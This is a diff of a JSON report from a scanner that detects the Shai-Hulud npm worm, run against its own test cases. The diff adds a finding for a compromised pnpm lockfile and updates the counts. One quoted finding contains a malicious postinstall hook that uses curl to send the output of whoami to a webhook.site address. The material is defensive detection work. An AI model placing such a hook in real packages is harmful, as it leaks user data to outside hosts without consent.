@@ -1,9 +1,9 @@
 {
   "scan_path": "../shai-hulud-detect/test-cases/",
-  "start_time": "2025-09-28T18:34:33.389260900Z",
-  "end_time": "2025-09-28T18:34:33.806519900Z",
-  "duration_seconds": 0.417,
-  "timestamp": "2025-09-28T18:34:33.389260900Z",
+  "start_time": "2025-09-28T19:11:35.891022900Z",
+  "end_time": "2025-09-28T19:11:36.338001700Z",
+  "duration_seconds": 0.446,
+  "timestamp": "2025-09-28T19:11:35.891022900Z",
   "files_scanned": 0,
   "results": [
     {
@@ -752,6 +752,18 @@
       ]
     },
     {
+      "file": "../shai-hulud-detect/test-cases/infected-lockfile-pnpm\\pnpm-lock.yaml",
+      "risk_level": "Medium",
+      "comment": "Package integrity issues: Recently modified lockfile contains compromised packages",
+      "patterns_detected": [
+        "package_integrity_issue"
+      ],
+      "details": [
+        "PNPM lockfile contains @ctrl packages (potential worm activity)",
+        "Verify package versions and regenerate lockfiles if necessary"
+      ]
+    },
+    {
       "file": "../shai-hulud-detect/test-cases/infected-project\\package-with-postinstall.json",
       "risk_level": "High",
       "comment": "Suspicious postinstall hook detected: curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)",
@@ -1114,8 +1126,8 @@
   ],
   "summary": {
     "high_risk_count": 22,
-    "medium_risk_count": 57,
+    "medium_risk_count": 58,
     "low_risk_count": 7,
-    "total_issues": 86
+    "total_issues": 87
   }
 }
